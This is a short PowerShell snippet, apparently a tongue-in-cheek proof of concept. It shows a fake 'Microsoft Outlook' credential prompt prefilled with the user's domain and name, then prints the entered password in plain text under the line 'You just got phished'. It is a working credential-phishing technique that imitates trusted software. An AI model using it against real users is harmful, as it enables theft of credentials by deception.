﻿$c = $Host.ui.PromptForCredential("Microsoft Outlook","Please enter your credentials into this totally credible software","$env:userdomain\$env:username","") 

echo 'You just got phished:' $c.GetNetworkCredential() | fl * 